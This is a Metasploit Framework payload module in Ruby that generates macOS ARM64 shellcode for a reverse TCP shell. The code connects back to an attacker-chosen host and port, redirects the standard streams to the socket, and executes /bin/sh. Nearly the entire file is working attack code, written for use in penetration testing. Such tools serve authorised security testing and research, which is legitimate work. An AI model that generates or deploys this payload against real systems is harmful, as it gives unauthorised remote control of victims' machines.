##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 188

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'OSX aarch64 Shell Reverse TCP',
        'Description' => 'Connect back to attacker and spawn a command shell',
        'Author' => [ 'alanfoster' ],
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_AARCH64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )

    # exec payload options
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),
        Opt::LHOST,
        Opt::LPORT(4444)
      ]
    )
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate(_opts = {})
    # Split the cmd string into arg chunks
    cmd_str = datastore['CMD']
    cmd_and_args = Shellwords.shellsplit(cmd_str).map { |s| "#{s}\x00" }

    cmd = cmd_and_args[0]
    args = cmd_and_args[1..]

    # Don't smash the real sp register, re-create our own on the x9 scratch register
    stack_register = :x9
    cmd_string_in_x0 = create_aarch64_string_in_stack(
      cmd,
      registers: {
        destination: :x0,
        stack: stack_register
      }
    )

    lport = datastore['LPORT'].to_i
    lhost = datastore['LHOST']

    lport_hex = [lport].pack('v').bytes.map { |b| b.to_s(16).rjust(2, '0') }.join
    lhost_hex = [IPAddr.new(lhost, Socket::AF_INET).to_i].pack('L<').bytes.map { |b| b.to_s(16).rjust(2, '0') }

    result = <<~EOF
      // socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
      // socket:
        mov x0, 0x2                   // x0 = AF_INET
        mov x1, 0x1                   // x1 = SOCK_STREAM
        mov x2, 0                     // x2 = IPPROTO_IP
        movz x16, #0x0200, lsl #16    // x16 = SYS_SOCKET 0x2000061
        movk x16, #0x0061
        svc 0                         // system call

        // Socket file descriptor will be in x0; Additionally the store socket file descriptor in x13
        mov x13, x0

      // connect(sockfd, socket={AF_INET,#{lport},#{lhost}}, socklen_t=16)
      // connect:
        // mov x0, x13                // x0 = socketfd, already set from previous socket result - additionally stored in x16
        lsl  x1, x1, #1               // x1 = struct socaddr_in; sin_family=AF_INET
        movk x1, #0x#{lport_hex}, lsl #16     //    sin_port = htons(#{lport})
        movk x1, #0x#{lhost_hex[2..3].join}, lsl #32       //    sin_addr = inet_aton(ip, &addr.sin_addr)
        movk x1, #0x#{lhost_hex[0..1].join}, lsl #48
        str x1, [sp, #-8]!
        mov x1, sp                    // XXX: Should be: add x1, sp, x2, but assembler does not support it
        add x1, x1, x2                // XXX: Should be: add x1, sp, x2, but assembler does not support it

        mov x2, 16                    // x2 = sizeof(struct sockaddr) = 16
        movz x16, #0x0200, lsl #16    // x16 = SYS_CONNECT 0x2000062
        movk x16, #0x0062
        svc 0

      // int dup2(int filedes=socketfd, int newfd=STDIN/STDOUT/STD)
      // dup2_calls:
        movz x16, #0x0200, lsl #16     // x16 = SYS_DUP2 0x200005a
        movk x16, #0x005a
        mov x0, x13                    // x0 = socket
        movz x1, 0                     // x1 = STDIN
        svc 0                          // system call
        mov x0, x13                    // x0 = socket
        movz x1, 1                     // x1 = STDOUT
        svc 0                          // system call
        mov x0, x13                    // x0 = socket
        movz x1, 2                     // x1 = STDERR
        svc 0                          // system call

      // int execve(const char *path, char *const argv[], char *const envp[]);
      // exec_call:
        // Set system call SYS_EXECVE 0x200003b in x16
        movz x16, #0x0200, lsl #16
        movk x16, #0x003b

        mov #{stack_register}, sp // Temporarily move SP into scratch register

        // Arg 0: execve - const char *path - Pointer to the program name to run
        #{cmd_string_in_x0}

        // Push execve arguments, using x1 as a temporary register
        #{args.each_with_index.map do |value, index|
            "// Push argument #{index}\n" +
              create_aarch64_string_in_stack(value, registers: { destination: :x1, stack: stack_register })
          end.join("\n")
        }

        // Arg 1: execve - char *const argv[] - program arguments
        #{cmd_and_args.each_with_index.map do |value, index|
            bytes_to_base_of_string = cmd_and_args[index..].sum { |string| align(string.bytesize) } + (index * 8)
            [
              "// argv[#{index}] = create pointer to base of string value #{value.inspect}",
              "mov x1, #{stack_register}",
              "sub x1, x1, ##{bytes_to_base_of_string} // Update the target register to point to base of the string",
              "str x1, [#{stack_register}], #8 // Store the pointer in the stack"
            ].join("\n") + "\n"
          end.join("\n")}

        // argv[#{cmd_and_args.length}] = NULL
        str xzr, [#{stack_register}], #8

        // Set execve arg1 to the base of the argv array of pointers
        mov x1, #{stack_register}
        sub x1, x1, ##{(cmd_and_args.length + 1) * 8}

        // Arg 2: execve - char *const envp[] - Environment variables, NULL for now
        mov x2, xzr
        // System call
        svc #0
    EOF

    compile_aarch64(result)
  end

  def create_aarch64_string_in_stack(string, registers: {})
    target = registers.fetch(:destination, :x0)
    stack = registers.fetch(:stack, :x9)

    # Instructions for pushing the bytes of the string 8 characters at a time
    push_string = string.bytes
                        .each_slice(8)
                        .each_with_index
                        .flat_map do |eight_byte_chunk, _chunk_index|
      mov_instructions = eight_byte_chunk
                         .each_slice(2)
                         .each_with_index
                         .map do |two_byte_chunk, index|
        two_byte_chunk = two_byte_chunk.reverse
        two_byte_chunk_hex = two_byte_chunk.map { |b| b.to_s(16).rjust(2, '0') }.join
        two_byte_chunk_chr = two_byte_chunk.map(&:chr).join
        "mov#{index == 0 ? 'z' : 'k'} #{target}, #0x#{two_byte_chunk_hex}#{index == 0 ? '' : ", lsl ##{index * 16}"} // #{two_byte_chunk_chr.inspect}"
      end
      [
        "// Next 8 bytes of string: #{eight_byte_chunk.map(&:chr).join.inspect}",
        *mov_instructions,
        "str #{target}, [#{stack}], #8 // Store #{target} on #{stack}-stack and increment by 8"
      ]
    end
    push_string = push_string.join("\n") + "\n"

    set_target_register_to_base_of_string = <<~EOF
      mov #{target}, #{stack} // Store the current stack location in the target register
      sub #{target}, #{target}, ##{align(string.bytesize)} // Update the target register to point to base of the string
    EOF

    result = <<~EOF
      #{push_string}
      #{set_target_register_to_base_of_string}
    EOF

    result
  end

  def align(value, alignment: 8)
    return value if value % alignment == 0

    value + (alignment - (value % alignment))
  end

  def compile_aarch64(asm_string)
    require 'aarch64/parser'
    parser = ::AArch64::Parser.new
    asm = parser.parse without_inline_comments(asm_string)

    asm.to_binary
  end

  # Remove any human readable comments that have been inlined
  def without_inline_comments(string)
    comment_delimiter = '//'
    result = string.lines(chomp: true).map do |line|
      instruction, _comment = line.split(comment_delimiter, 2)
      next if instruction.blank?

      instruction
    end.compact
    result.join("\n") + "\n"
  end
end
